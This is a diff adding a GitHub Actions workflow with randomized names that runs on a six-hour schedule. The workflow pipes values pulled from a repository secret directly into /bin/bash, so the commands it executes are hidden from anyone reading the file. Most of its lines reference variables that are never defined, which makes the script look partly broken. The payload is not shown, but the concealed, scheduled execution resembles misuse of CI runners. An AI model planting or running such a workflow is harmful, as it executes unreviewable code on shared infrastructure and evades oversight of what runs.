@@ -1,0 +1,22 @@
+name: duolanjiann
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duolanjiann
+        env:
+          tnr7238: ${{ secrets.tnr7238 }}
+        run: |
+          echo $tnr7238 | jq -r .tuhxn54188 | /bin/bash
+          echo $r38 | jq -r .hiv0600 | /bin/bash
+          echo $r6036 | jq -r .asn3 | /bin/bash
+          echo $zkp8 | jq -r .jaota8964 | /bin/bash
+          echo $psm8393 | jq -r .f10678 | /bin/bash
+          echo $oq36925 | jq -r .frgev37865 | /bin/bash
+
